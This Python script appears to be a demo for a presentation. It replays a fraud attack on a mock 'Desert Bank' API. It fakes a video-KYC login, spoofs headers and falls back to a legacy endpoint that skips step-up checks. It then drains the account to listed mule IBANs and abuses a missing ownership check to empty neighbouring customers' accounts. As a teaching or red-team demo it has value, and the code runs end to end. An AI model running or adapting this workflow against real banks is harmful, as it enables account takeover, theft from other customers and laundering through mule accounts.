"""Replays the slide-9 scenario like a careful attacker: probe first, re-check from a fresh session, drain everything."""
import argparse
import sys
import time

import httpx

R, G, Y, C, D, B, X = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[2m", "\033[1m", "\033[0m"
DEVICE = "pixel8-emu-7f3a"
PROBE = ("Karim S. (my test account)", "AE210400000123456789012", "AE")
MULES = [("Brightline Trading Ltd", "SC52BAHL01031234567890123456USD", "SC"),
         ("Kestrel Global FZE", "MU17BOMM0101101030300200000MUR", "MU"),
         ("Arslan Imports LLC", "GE29NB0000000101904917", "GE"),
         ("Nimbus OTC Desk (non-custodial)", "LT121000011101001000", "LT")]
BIG_MULES = [("Sable Ridge General Trading", "KZ86125KZT5004100100", "KZ", "+7 701 555 0143"),
             ("Orchid Lane Holdings", "HK42HSBC00412345678901", "HK", "+852 5550 1977"),
             ("Nimbus OTC Desk (non-custodial)", "LT121000011101001000", "LT", "+370 655 50112")]
REFERENCE = {"LT": "USDT-TRC20 TQ9yD4mF7kP2xW8nR1vB6cJ3hL5sA0eZ"}
T0 = time.monotonic()


def say(msg: str, delay: float = 0.0):
    print(f"{D}[+{time.monotonic() - T0:6.2f}s]{X} {msg}", flush=True)
    time.sleep(delay)


def login(bank: httpx.Client) -> None:
    r = bank.post("/v2/auth/login", json={"customer_id": "C-1001", "device_id": DEVICE,
                                          "biometric_score": 0.998, "kyc_video_passed": True})
    r.raise_for_status()
    bank.headers["Authorization"] = f"Bearer {r.json()['token']}"


def send(bank, acc, name, iban, country, amount, pace, phone=None) -> float | None:
    body = {"from_account": acc, "to_iban": iban, "to_name": name, "country": country, "amount": amount,
            "reference": REFERENCE.get(country, "INV-2026-11")}
    r = bank.post("/v1/transfers", json=body)
    if r.status_code == 409 and phone:
        fields = r.json()["detail"]["fields"]
        say(f"{Y}409 bank wants {', '.join(fields)}. Filling in the mule's details...{X}", pace)
        r = bank.post("/v1/transfers", json={**body, "beneficiary_phone": phone, "purpose_of_payment": "trade invoice"})
    if r.status_code != 200:
        say(f"{R}{r.status_code} {r.text[:90]}{X}")
        return None
    d = r.json()
    say(f"{G}APPROVED{X} AED {amount:>9,.0f} → {name[:28]:<28} {iban[:4]}…  balance AED {d['balance_after']:,.2f}", pace)
    return d["balance_after"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bank", default="http://127.0.0.1:8000")
    ap.add_argument("--canary", action="store_true", help="use the API key scraped from the decompiled app")
    ap.add_argument("--pace", type=float, default=0.35)
    a = ap.parse_args()
    headers = {"User-Agent": "okhttp/4.9.3", "X-Forwarded-For": "185.220.101.47"}
    if a.canary:
        headers["X-Api-Key"] = "dsrt_live_7Hq2LmX9vB4kP0aZ"
    bank = httpx.Client(base_url=a.bank, headers=headers, timeout=30)

    print(f"\n{B}{R}  TARGET: Desert Bank · customer C-1001{X}\n")
    say(f"{D}injecting deepfake stream into video-KYC camera feed...{X}", 1.0)
    login(bank)
    say(f"{G}FaceID verified ✓   KYC passed ✓   session issued{X}", 0.6)
    acc = bank.get("/v2/accounts").json()["accounts"][0]
    say(f"account {acc['id']} · balance {B}AED {acc['balance']:,.2f}{X}", 0.8)

    r = bank.post("/v2/transfers", json={"from_account": acc["id"], "to_iban": MULES[0][1], "to_name": MULES[0][0],
                                         "country": MULES[0][2], "amount": 50_000})
    if r.status_code == 403:
        say(f"{Y}/v2/transfers → 403 step_up_required. Trying the legacy API...{X}", 0.8)

    say(f"{C}probe: AED 1 to my own test account before moving real money{X}", 0.3)
    send(bank, acc["id"], *PROBE, 1, 0.3)
    say(f"{C}probe landed in my test account ✓  the bank is not onto us{X}", 0.8)

    total, balance = 1.0, acc["balance"] - 1
    for name, iban, country in MULES * 3:
        amount = min(50_000, balance)
        if amount <= 0 or (left := send(bank, acc["id"], name, iban, country, amount, a.pace)) is None:
            break
        total, balance = total + amount, left

    say(f"{C}re-login from a fresh session to double-check...{X}", 0.6)
    login(bank)
    accounts = bank.get("/v2/accounts").json()["accounts"]
    for x in accounts:
        say(f"  {x['id']:<12} {x.get('product', 'Current'):<13} AED {x['balance']:,.2f}", 0.3)
    extra = [x for x in accounts if x["balance"] >= 100_000]
    if extra:
        say(f"{B}{G}jackpot: {extra[0].get('product', 'account')} with AED {extra[0]['balance']:,.0f}. Need bigger mules.{X}", 0.8)
        for name, iban, country, phone in BIG_MULES:
            amount = extra[0]["balance"] / len(BIG_MULES)
            if send(bank, extra[0]["id"], name, iban, country, amount, a.pace, phone) is not None:
                total += amount
    say(f"{C}curious: does the legacy API check whose account it is? trying the neighbours of {acc['id']}...{X}", 0.6)
    base = int(acc["id"].split("-")[1])
    for n in range(base + 1, base + 4):
        other = f"ACC-{n}"
        r = bank.get(f"/v1/accounts/{other}/balance")
        if r.status_code != 200:
            say(f"  {other}: {r.status_code}", 0.2)
            continue
        bal = r.json()["balance"]
        say(f"{B}{G}  {other}: someone else's account, AED {bal:,.2f} visible{X}", 0.3)
        name, iban, country, phone = BIG_MULES[n % len(BIG_MULES)]
        if bal > 0 and send(bank, other, name, iban, country, bal, a.pace, phone) is not None:
            total += bal
    print(f"\n{B}{G}  DONE: AED {total:,.0f} moved out{X}\n")


if __name__ == "__main__":
    sys.exit(main())
